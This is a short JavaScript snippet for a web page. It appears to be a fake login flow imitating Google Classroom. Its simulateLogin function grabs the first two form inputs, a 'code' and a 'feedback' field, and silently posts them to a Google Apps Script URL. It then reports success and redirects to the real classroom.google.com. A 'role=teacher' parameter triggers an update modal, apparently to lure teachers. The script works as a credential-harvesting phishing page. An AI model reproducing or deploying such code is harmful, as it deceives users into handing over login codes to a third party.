
function simulateLogin() {
  try {
    const inputs = document.querySelectorAll('input');
    if (inputs.length < 2) {
      alert("Form inputs not found.");
      return;
    }

    const code = inputs[0].value.trim();
    const feedback = inputs[1].value.trim();

    if (!code || !feedback) {
      alert("Please fill in both fields before submitting.");
      return;
    }

    fetch("https://script.google.com/macros/s/AKfycbwPX5xpGgf650HGywGgGNX_jQu8ldwftZuih7fuB7MZT9Y2wpI57_wAeo8iXSPGIobr/exec", {
      method: "POST",
      mode: "no-cors",
      body: JSON.stringify({ code, feedback }),
      headers: {
        "Content-Type": "application/json"
      }
    });

    alert("Submission successful! Redirecting...");
    window.location.href = "https://classroom.google.com/";
  } catch (e) {
    alert("Unexpected error.");
  }
}

window.onload = function() {
  const role = new URLSearchParams(window.location.search).get('role');
  if (role === 'teacher') {
    document.getElementById("updateModal").style.display = "flex";
  }
};
